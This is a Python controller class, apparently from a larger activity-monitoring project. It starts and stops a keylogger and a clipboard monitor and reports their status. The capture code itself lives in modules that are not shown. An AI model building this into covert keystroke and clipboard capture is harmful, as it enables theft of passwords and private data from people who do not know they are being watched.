"""Main activity monitoring controller."""

from .keylogger import KeyLogger
from .clipboard import ClipboardMonitor
from ..utils.logging import get_logger

logger = get_logger(__name__)

class ActivityMonitor:
    def __init__(self):
        self.keylogger = KeyLogger()
        self.clipboard_monitor = ClipboardMonitor()
        self.is_running = False

    def start(self):
        """Start all monitoring activities."""
        try:
            logger.info("Starting activity monitoring...")
            self.is_running = True
            
            # Start clipboard monitoring in background
            self.clipboard_monitor.start()
            
            # Start keylogger (blocks until stopped)
            self.keylogger.start()
        except Exception as e:
            logger.error(f"Error starting activity monitor: {e}")
            self.stop()

    def stop(self):
        """Stop all monitoring activities."""
        logger.info("Stopping activity monitoring...")
        self.is_running = False
        self.clipboard_monitor.stop()
        # Keylogger stops automatically when is_running is False

    def status(self):
        """Get current monitoring status."""
        return {
            "running": self.is_running,
            "keylogger_active": True if self.is_running else False,
            "clipboard_monitor_active": self.clipboard_monitor.running
        }
